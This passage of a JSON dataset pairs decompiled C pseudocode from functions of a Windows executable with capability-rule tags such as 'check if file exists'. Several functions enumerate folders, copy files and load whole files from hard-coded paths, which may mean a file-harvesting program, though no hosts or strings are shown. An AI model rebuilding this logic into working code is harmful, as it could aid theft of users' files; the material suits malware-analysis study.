*pcVar2 + uVar4;\n                *pcVar2 = *pcVar2 + uVar4;\n                LOCK();\n                out(param_2, uVar4);\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x2:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x3:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x4:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x5:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            var_4h = 0x40;\n            iVar6 = (**0x440024)(puVar8[-6] + *(unaff_EDI + 0x144), puVar8[-7], 0x40, &var_4h);\n            if (iVar6 == 0) {\n                return 9;\n            }\n            param_2 = *(unaff_EDI + 0x46);\n            uVar7 = uVar7 + 1;\n            puVar8 = puVar8 + 10;\n        } while (uVar7 < param_2);\n    }\n    return 0;\n}\n",
        "token_count": 4390
    },
    "00406670": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406670(int32_t *arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    \n    if (arg_10h != NULL) {\n        *arg_10h = arg_8h[0xf];\n    }\n    if ((*arg_8h == 4) || (*arg_8h == 5)) {\n        (**(arg_ch + 0x24))(*(arg_ch + 0x28), arg_8h[3]);\n    }\n    if (*arg_8h == 6) {\n        (**(arg_ch + 0x24))(*(arg_ch + 0x28), arg_8h[1]);\n    }\n    arg_8h[0xd] = arg_8h[10];\n    arg_8h[0xc] = arg_8h[10];\n    *arg_8h = 0;\n    arg_8h[7] = 0;\n    arg_8h[8] = 0;\n    if (arg_8h[0xe] != NULL) {\n        iVar1 = (*arg_8h[0xe])(0, 0, 0);\n        arg_8h[0xf] = iVar1;\n        *(arg_ch + 0x30) = iVar1;\n    }\n    return;\n}\n",
        "token_count": 300
    },
    "004067b0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004067b0(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if ((*arg_8h == 4) || (*arg_8h == 5)) {\n        (**(arg_ch + 0x24))(*(arg_ch + 0x28), arg_8h[3]);\n    }\n    if (*arg_8h == 6) {\n        (**(arg_ch + 0x24))(*(arg_ch + 0x28), arg_8h[1]);\n    }\n    arg_8h[0xd] = arg_8h[10];\n    arg_8h[0xc] = arg_8h[10];\n    *arg_8h = 0;\n    arg_8h[7] = 0;\n    arg_8h[8] = 0;\n    if (arg_8h[0xe] != NULL) {\n        iVar1 = (*arg_8h[0xe])(0, 0, 0);\n        arg_8h[0xf] = iVar1;\n        *(arg_ch + 0x30) = iVar1;\n    }\n    (**(arg_ch + 0x24))(*(arg_ch + 0x28), arg_8h[10]);\n    (**(arg_ch + 0x24))(*(arg_ch + 0x28), arg_8h[9]);\n    (**(arg_ch + 0x24))(*(arg_ch + 0x28), arg_8h);\n    return 0;\n}\n",
        "token_count": 345
    },
    "00405b20": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00405b20(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    \n    iVar1 = 0;\n    if ((arg_8h != 0) && (iVar1 = fcn.0042b9b1(arg_8h),  iVar1 == 0)) {\n        arg_8h = 0;\n        fcn.0042b329(&arg_8h);\n        var_ch = 0x4453c4;\n        iVar1 = fcn.0042ba31(&var_ch, 0x44c830);\n    }\n    return iVar1;\n}\n",
        "token_count": 145
    },
    "00408b10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_108h\n\nvoid __cdecl fcn.00408b10(uint arg_8h, uint arg_ch, uint *arg_10h, uint *arg_14h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint unaff_ESI;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    fcn.0042ad40(&var_108h, arg_8h);\n    iVar1 = fcn.00408140(*in_ECX, &var_108h, (arg_ch != '\\0') + 1);\n    if (iVar1 == 0) {\n        if (in_ECX[1] != -1) {\n            fcn.00408430(*in_ECX);\n        }\n        in_ECX[1] = -1;\n        arg_8h_00 = *(*in_ECX + 0x10);\n        if (arg_10h != NULL) {\n            *arg_10h = arg_8h_00;\n        }\n        if (arg_14h != NULL) {\n            fcn.004084c0(arg_8h_00, arg_14h);\n        }\n        fcn.0042ad2a(unaff_ESI);\n        return;\n    }\n    if (arg_10h != NULL) {\n        *arg_10h = 0xffffffff;\n    }\n    if (arg_14h != NULL) {\n        fcn.0042acb0(arg_14h, 0, 300);\n        *arg_14h = 0xffffffff;\n    }\n    fcn.0042ad2a(var_108h);\n    return;\n}\n",
        "token_count": 401
    },
    "0040b5d0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b5d0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_EDI;\n    uint var_450h;\n    uint var_424h;\n    uint var_310h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    (**0x4690ac)(&var_310h, 0x446e60, arg_8h, arg_ch);\n    iVar1 = (**0x469318)(&var_310h, &var_450h);\n    if (iVar1 != -1) {\n        do {\n            iVar2 = (**0x469288)(&var_424h, 0x446e5c);\n            if (iVar2 != 0) {\n                iVar2 = (**0x469288)(&var_424h, 0x446e58);\n                if (iVar2 != 0) {\n                    fcn.0042acb0(&var_20ch, 0, 0x104);\n                    fcn.0042acb0(&var_108h, 0, 0x104);\n                    (**0x469258)(&var_20ch, 0x446e48);\n                    (**0x469258)(&var_20ch, &var_424h);\n                    (**0x469258)(&var_108h, arg_8h);\n                    (**0x469258)(&var_108h, 0x445418);\n                    (**0x469258)(&var_108h, &var_424h);\n                    fcn.00429f90(*0x45869c, &var_20ch, &var_108h);\n                }\n            }\n            iVar2 = (**0x469170)(iVar1, &var_450h);\n        } while (iVar2 != 0);\n        (**0x4690e0)(iVar1);\n    }\n    fcn.0042ad2a(unaff_EDI);\n    return;\n}\n",
        "token_count": 470
    },
    "0040c350": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c350(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_78ch;\n    uint var_788h;\n    uint var_784h;\n    uint var_780h;\n    uint var_77ch;\n    uint var_775h;\n    uint32_t var_758h;\n    uint var_748h;\n    uint32_t var_744h;\n    uint *var_73ch;\n    uint var_72ch;\n    uint32_t var_728h;\n    uint32_t var_720h;\n    uint var_710h;\n    uint32_t var_70ch;\n    uint var_704h;\n    uint var_31ch;\n    uint var_218h;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43dd82;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.0042acb0(&var_31ch, 0, 0x104, var_10h);\n    fcn.0042acb0(&var_114h, 0, 0x104);\n    var_77ch = 0;\n    var_780h = 0;\n    uVar1 = fcn.00421020(0x1a);\n    (**0x469258)(&var_31ch, uVar1);\n    (**0x469258)(&var_31ch, *0x458098);\n    (**0x469258)(&var_114h, &var_31ch);\n    (**0x469258)(&var_114h, 0x445418);\n    (**0x469258)(&var_114h, *0x458030);\n    var_70ch = 0xf;\n    var_710h = 0;\n    var_720h = var_720h & 0xffffff00;\n    uVar1 = fcn.0042b420(&var_114h);\n    fcn.00406270(&var_114h, uVar1);\n    var_4h = 0;\n    puVar2 = fcn.00424320(&var_758h, &var_720h);\n    var_4h = CONCAT31(var_4h._1_3_, 1);\n    if (7 < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    iVar3 = fcn.00420f60(puVar2);\n    if (7 < var_744h) {\n        fcn.0042ac49(var_758h);\n    }\n    var_744h = 7;\n    var_748h = 0;\n    var_758h = var_758h & 0xffff0000;\n    var_4h = 0xffffffff;\n    if (0xf < var_70ch) {\n        fcn.0042ac49(var_720h);\n    }\n    if (iVar3 != 0) {\n        iVar3 = fcn.0041a3a0(&var_114h, &var_77ch, &var_780h);\n        if (iVar3 != 0) {\n            var_70ch = 0xf;\n            var_710h = 0;\n            var_720h = var_720h & 0xffffff00;\n            uVar4 = fcn.0042b420(arg_8h);\n            fcn.00406270(arg_8h, uVar4);\n            var_4h = 2;\n            fcn.00424850(&var_73ch, &var_720h);\n            var_4h._0_1_ = 4;\n            if (0xf < var_70ch) {\n                fcn.0042ac49(var_720h);\n            }\n            var_70ch = 0xf;\n            var_710h = 0;\n            var_720h = var_720h & 0xffffff00;\n            fcn.0042acb0(&var_218h, 0, 0x104);\n            (**0x469258)(&var_218h, *0x457d6c);\n            uVar4 = fcn.0042b420(&var_218h);\n            iVar3 = fcn.0040b910(&var_218h, 0, uVar4);\n            if (iVar3 != -1) {\n                fcn.00405a90(0, iVar3 + 0xc);\n                fcn.00405a90(0x8c, 0xffffffff);\n                puVar2 = var_73ch;\n                if (var_728h < 0x10) {\n                    puVar2 = &var_73ch;\n                }\n                iVar3 = fcn.00415980(puVar2, &var_788h, &var_784h);\n                if (iVar3 != 0) {\n                    fcn.0042acb0(&var_704h, 0, 1000);\n                    puVar2 = fcn.0041ac80(&var_758h, var_788h, var_784h, var_77ch, var_780h);\n                    var_4h._0_1_ = 5;\n                    if (0xf < puVar2[5]) {\n                        puVar2 = *puVar2;\n                    }\n                    (**0x469258)(&var_704h, puVar2);\n                    var_4h._0_1_ = 4;\n                    fcn.00405ce0();\n                    (**0x469258)(arg_ch, *0x4581f8);\n                    iVar3 = (**0x469288)(&var_704h, 0x446f90);\n                    if (iVar3 != 0) {\n                        puVar2 = fcn.0041ac80(&var_775h + 1, var_788h, var_784h, var_77ch, var_780h);\n                        var_4h._0_1_ = 6;\n                        if (0xf < puVar2[5]) {\n                            puVar2 = *puVar2;\n                        }\n                        (**0x469258)(arg_ch, puVar2);\n                        var_4h._0_1_ = 4;\n                        fcn.00405ce0();\n                    }\n                    (**0x469258)(arg_ch, 0x44540c);\n                }\n            }\n            var_4h = 0xffffffff;\n            if (0xf < var_728h) {\n                fcn.0042ac49(var_73ch);\n            }\n            var_728h = 0xf;\n            var_72ch = 0;\n            var_73ch = var_73ch & 0xffffff00;\n        }\n    }\n    fcn.00415a80(&var_77ch, &var_780h);\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(uVar1);\n    return;\n}\n",
        "token_count": 1616
    },
    "0040c790": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040c790(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch, uint noname_6, \n            uint arg_24h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint var_564h;\n    uint var_560h;\n    uint var_534h;\n    uint var_420h;\n    uint var_31ch;\n    uint var_218h;\n    uint var_114h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43ddb8;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_8h_00 = 0;\n    var_4h = 0;\n    uVar1 = (**0x4692b4)(0, 9999999, var_10h);\n    var_564h = (**0x46923c)(uVar1);\n    (**0x4690ac)(&var_31ch, 0x446f98, arg_24h);\n    iVar2 = (**0x469318)(&var_31ch, &var_560h);\n    if (iVar2 != -1) {\n        do {\n            iVar3 = (**0x469288)(&var_534h, 0x446e5c);\n            if ((iVar3 != 0) && (iVar3 = (**0x469288)(&var_534h, 0x446e58),  iVar3 != 0)) {\n                (**0x4690ac)(&var_420h, 0x446e60, arg_24h, &var_534h);\n                fcn.0042acb0(&var_114h, 0, 0x104);\n                (**0x469258)(&var_114h, *0x458374);\n                uVar1 = fcn.00420ef0(0x1a);\n                (**0x469258)(&var_114h, uVar1);\n                (**0x469100)(&var_420h, &var_114h, 1);\n                fcn.0040c350(&var_114h, var_564h);\n                (**0x46915c)(&var_114h);\n            }\n            iVar3 = (**0x469170)(iVar2, &var_560h);\n        } while (iVar3 != 0);\n        (**0x4690e0)(iVar2);\n        fcn.0042acb0(&var_218h, 0, 0x104);\n        (**0x469258)(&var_218h, *0x458568);\n        uVar1 = (**0x469150)(var_564h);\n        fcn.00429fe0(*0x45869c, &var_218h, var_564h, uVar1);\n        fcn.0042acb0(&var_564h, 0, 4);\n    }\n    if (0xf < arg_1ch) {\n        fcn.0042ac49(arg_8h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 789
    },
    "0040ce80": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040d1d4)\n\nvoid __cdecl fcn.0040ce80(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint var_2ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x43dde8;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    var_4h = 0;\n    fcn.00406180(&arg_8h, 0, 0xffffffff);\n    uVar1 = fcn.0042b420(0x446fc0);\n    fcn.0040b910(0x446fc0, 0, uVar1);\n    uVar1 = fcn.0042b420(0x446fb0);\n    fcn.0040b910(0x446fb0, 0, uVar1);\n    uVar1 = fcn.0042b420(0x446fa0);\n    fcn.0040b910(0x446fa0, 0, uVar1);\n    uVar1 = *0x458490;\n    uVar2 = fcn.0042b420(*0x458490);\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x458394;\n    uVar2 = fcn.0042b420(*0x458394);\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x4583a0;\n    uVar2 = fcn.0042b420(*0x4583a0);\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x458078;\n    uVar2 = fcn.0042b420(*0x458078);\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x458130;\n    uVar2 = fcn.0042b420(*0x458130);\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x4583b4;\n    uVar2 = fcn.0042b420(*0x4583b4);\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x457eb4;\n    uVar2 = fcn.0042b420(*0x457eb4);\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x4582f4;\n    uVar2 = fcn.0042b420(*0x4582f4);\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x458034;\n    uVar2 = fcn.0042b420(*0x458034);\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x458220;\n    uVar2 = fcn.0042b420(*0x458220);\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x4581a4;\n    uVar2 = fcn.0042b420(*0x4581a4);\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x45854c;\n    uVar2 = fcn.0042b420(*0x45854c);\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x4582c8;\n    uVar2 = fcn.0042b420(*0x4582c8);\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x458358;\n    uVar2 = fcn.0042b420(*0x458358);\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x4580cc;\n    uVar2 = fcn.0042b420(*0x4580cc);\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x4581a0;\n    uVar2 = fcn.0042b420(*0x4581a0);\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x457eb0;\n    uVar2 = fcn.0042b420(*0x457eb0);\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x457d88;\n    uVar2 = fcn.0042b420(*0x457d88);\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x457f1c;\n    uVar2 = fcn.0042b420(*0x457f1c);\n    arg_8h_00 = 0;\n    fcn.0040b910(uVar1, 0, uVar2);\n    uVar1 = *0x4583b0;\n    uVar2 = fcn.0042b420(*0x4583b0);\n    fcn.0040b910(uVar1, 0, uVar2);\n    if (0xf < arg_1ch) {\n        fcn.0042ac49(arg_8h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 1399
    },
    "0040d9a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040d9a0(uchar *arg_8h, int32_t **arg_ch)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t **ppiVar5;\n    int32_t **var_4h;\n    \n    uVar2 = fcn.0042b420(0x446fdc);\n    iVar3 = fcn.0040b9c0(0x446fdc, 0, uVar2);\n    uVar2 = fcn.0042b420(0x446fdc);\n    iVar4 = fcn.0040ba30(0x446fdc, 0xffffffff, uVar2);\n    piVar1 = arg_ch[5];\n    if (iVar3 == -1) {\n        ppiVar5 = arg_ch;\n        if (0xf < piVar1) {\n            ppiVar5 = *arg_ch;\n        }\n    }\n    else {\n        ppiVar5 = arg_ch;\n        if (0xf < piVar1) {\n            ppiVar5 = *arg_ch;\n        }\n        ppiVar5 = ppiVar5 + iVar3;\n    }\n    if (iVar4 == -1) {\n        if (piVar1 < 0x10) {\n            var_4h = arg_ch[4] + arg_ch;\n        }\n        else {\n            var_4h = arg_ch[4] + *arg_ch;\n        }\n    }\n    else {\n        if (0xf < piVar1) {\n            arg_ch = *arg_ch;\n        }\n        var_4h = arg_ch + iVar4 + 1;\n    }\n    *(arg_8h + 0x14) = 0xf;\n    *(arg_8h + 0x10) = 0;\n    *arg_8h = 0;\n    if (ppiVar5 != var_4h) {\n        fcn.00406270(ppiVar5, var_4h - ppiVar5);\n    }\n    return arg_8h;\n}\n",
        "token_count": 462
    },
    "00412550": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412550(uint arg_8h, uint arg_ch, uint *arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_564h;\n    uint var_560h;\n    uint var_55ch;\n    uint var_554h;\n    uint var_528h;\n    uint var_414h;\n    uint var_310h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    fcn.0042acb0(&var_20ch, 0, 0x104);\n    arg_8h_00 = fcn.00421020(0x1a);\n    (**0x469258)(&var_20ch);\n    if (arg_18h == 0) {\n        (**0x4690ac)(&var_414h, 0x447290, &var_20ch, arg_8h, arg_10h);\n    }\n    else {\n        (**0x4690ac)(&var_414h, 0x44729c, &var_20ch, arg_8h);\n    }\n    iVar1 = (**0x469318)(&var_414h, &var_554h);\n    if (iVar1 != -1) {\n        do {\n            iVar2 = (**0x469288)(&var_528h, 0x446e5c);\n            if ((iVar2 != 0) && (iVar2 = (**0x469288)(&var_528h, 0x446e58),  iVar2 != 0)) {\n                if (arg_18h == 0) {\n                    (**0x4690ac)(&var_310h, 0x447290, &var_20ch, arg_8h, &var_528h);\n                }\n                else {\n                    (**0x4690ac)(&var_310h, 0x447284, &var_20ch, arg_8h, &var_528h, arg_10h);\n                }\n                iVar2 = fcn.00420f90(&var_310h);\n                if (iVar2 != 0) {\n                    fcn.0042acb0(&var_108h, 0, 0x104);\n                    (**0x469258)(&var_108h, 0x445418);\n                    (**0x469258)(&var_108h, 0x447280);\n                    (**0x469258)(&var_108h, 0x447254);\n                    (**0x469258)(&var_108h, 0x44727c);\n                    (**0x469258)(&var_108h, 0x44727c);\n                    (**0x469258)(&var_108h, 0x447278);\n                    (**0x469258)(&var_108h, 0x447274);\n                    (**0x469258)(&var_108h, 0x447270);\n                    (**0x469258)(&var_108h, 0x445418);\n                    (**0x469258)(&var_108h, arg_ch);\n                    (**0x469258)(&var_108h, 0x445418);\n                    if (arg_18h == 0) {\n                        puVar3 = &var_528h;\n                    }\n                    else {\n                        (**0x469258)(&var_108h, &var_528h);\n                        (**0x469258)(&var_108h, 0x445418);\n                        puVar3 = arg_10h;\n                    }\n                    (**0x469258)(&var_108h, puVar3);\n                    fcn.00429f90(arg_14h, &var_108h, &var_310h);\n                }\n            }\n            iVar2 = (**0x469170)(iVar1, &var_554h);\n        } while (iVar2 != 0);\n        (**0x4690e0)(iVar1);\n    }\n    fcn.0042ad2a(arg_8h_00);\n    return;\n}\n",
        "token_count": 947
    },
    "00412830": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00412830(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint unaff_EDI;\n    uint *puVar5;\n    uint var_560h;\n    uint var_55ch;\n    uint var_558h;\n    uint var_554h;\n    uint var_528h;\n    uint var_414h;\n    uint var_310h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    uVar4 = arg_8h;\n    uVar1 = fcn.00421020(0x1a);\n    (**0x4690ac)(&var_310h, 0x44729c, uVar1, uVar4);\n    iVar2 = (**0x469318)(&var_310h, &var_554h);\n    if (iVar2 != -1) {\n        do {\n            iVar3 = (**0x469288)(&var_528h, 0x446e5c);\n            if (iVar3 != 0) {\n                iVar3 = (**0x469288)(&var_528h, 0x446e58);\n                if (iVar3 != 0) {\n                    (**0x4690ac)(&var_20ch, 0x446e60, arg_8h, &var_528h);\n                    puVar5 = &var_20ch;\n                    uVar4 = fcn.00421020(0x1a);\n                    (**0x4690ac)(&var_414h, 0x446e60, uVar4, puVar5);\n                    fcn.0042acb0(&var_108h, 0, 0x104);\n                    (**0x469258)(&var_108h, 0x445418);\n                    (**0x469258)(&var_108h, 0x447280);\n                    (**0x469258)(&var_108h, 0x447254);\n                    (**0x469258)(&var_108h, 0x44727c);\n                    (**0x469258)(&var_108h, 0x44727c);\n                    (**0x469258)(&var_108h, 0x447278);\n                    (**0x469258)(&var_108h, 0x447274);\n                    (**0x469258)(&var_108h, 0x447270);\n                    (**0x469258)(&var_108h, arg_8h);\n                    (**0x469258)(&var_108h, 0x445418);\n                    (**0x469258)(&var_108h, &var_528h);\n                    fcn.00429f90(arg_14h, &var_108h, &var_414h);\n                    if ((var_554h & 0x10) != 0) {\n                        fcn.00412830(&var_20ch, arg_ch, arg_10h, arg_14h);\n                    }\n                }\n            }\n            iVar3 = (**0x469170)(iVar2, &var_554h);\n        } while (iVar3 != 0);\n        (**0x4690e0)(iVar2);\n    }\n    fcn.0042ad2a(unaff_EDI);\n    return;\n}\n",
        "token_count": 789
    },
    "00415630": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00415630(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    fcn.0042a3db(0);\n    iVar1 = *(param_1 + 4);\n    if ((iVar1 != 0) && (iVar1 != -1)) {\n        *(param_1 + 4) = iVar1 + -1;\n    }\n    iVar1 = *(param_1 + 4);\n    fcn.0042a403();\n    return ~-(iVar1 != 0) & param_1;\n}\n",
        "token_count": 132
    },
    "00415680": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415680(uint32_t *param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_4h;\n    \n    uVar1 = *param_1;\n    if (uVar1 != 0) {\n        fcn.0042a3db(0);\n        iVar2 = *(uVar1 + 4);\n        if ((iVar2 != 0) && (iVar2 != -1)) {\n            *(uVar1 + 4) = iVar2 + -1;\n        }\n        iVar2 = *(uVar1 + 4);\n        fcn.0042a403();\n        puVar3 = ~-(iVar2 != 0) & uVar1;\n        if (puVar3 != NULL) {\n            (***puVar3)(1);\n        }\n    }\n    return;\n}\n",
        "token_count": 196
    },
    "00415720": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00415720(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    iVar1 = **(in_ECX + 0x30);\n    *arg_8h = iVar1;\n    fcn.0042a3db(0);\n    if (*(iVar1 + 4) != -1) {\n        *(iVar1 + 4) = *(iVar1 + 4) + 1;\n    }\n    fcn.0042a403();\n    return arg_8h;\n}\n",
        "token_count": 136
    },
    "004158e0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint8_t __cdecl fcn.004158e0(uint arg_8h, int32_t *arg_ch, int32_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar1 = 0;\n    iVar2 = (**0x4690ec)(arg_8h, 0x80000000, 1, 0, 3, 0, 0);\n    if ((iVar2 != 0) && (iVar2 != -1)) {\n        iVar3 = (**0x4690a4)(iVar2, &var_ch);\n        if ((iVar3 != 0) && (var_8h == 0)) {\n            *arg_10h = var_ch;\n            iVar3 = (**0x469200)(0x40, var_ch);\n            *arg_ch = iVar3;\n            if (iVar3 != 0) {\n                uVar1 = (**0x469214)(iVar2, iVar3, *arg_10h, &var_4h, 0);\n                uVar1 = uVar1 & *arg_10h == var_4h;\n                if (uVar1 == 0) {\n                    (**0x469300)(*arg_ch);\n                }\n            }\n        }\n        (**0x4690f0)(iVar2);\n    }\n    return uVar1;\n}\n",
        "token_count": 332
    },
    "00416cb0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00416cb0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *arg_8h_00;\n    uint arg_ch_00;\n    uint *arg_10h_00;\n    uint *arg_14h_00;\n    uint var_35ch;\n    uint var_358h;\n    uint var_354h;\n    uint var_350h;\n    uint var_34ch;\n    uint var_320h;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x456900 ^ &stack0xfffffffc;\n    (**0x4690ac)(&var_20ch, 0x446f98, arg_ch);\n    arg_14h_00 = &var_34ch;\n    arg_10h_00 = &var_20ch;\n    iVar1 = (**0x469318)();\n    if (iVar1 != -1) {\n        do {\n            arg_ch_00 = 0x446e5c;\n            arg_8h_00 = &var_320h;\n            iVar2 = (**0x469288)();\n            if ((iVar2 != 0) && (iVar2 = (**0x469288)(&var_320h, 0x446e58),  iVar2 != 0)) {\n                (**0x4690ac)(&var_108h, 0x446e60, arg_ch, &var_320h);\n                iVar2 = (**0x469288)(&var_320h, *0x458238);\n                if (iVar2 == 0) {\n                    fcn.004164b0(&var_108h, arg_8h, arg_10h, arg_14h);\n                }\n                else {\n                    iVar2 = (**0x469288)(&var_320h, *0x457d44);\n                    if (iVar2 == 0) {\n                        fcn.00416aa0(&var_108h, arg_8h, arg_10h, arg_14h);\n                    }\n                    else {\n                        iVar2 = (**0x469288)(&var_320h, *0x4585ac);\n                        if (iVar2 == 0) {\n                            fcn.00416200(arg_8h, arg_10h, arg_ch, arg_18h);\n                        }\n                        else {\n                            iVar2 = (**0x469288)(&var_320h, *0x457dc8);\n                            if (iVar2 == 0) {\n                                if (*(in_ECX + 2) != '\\0') {\n                                    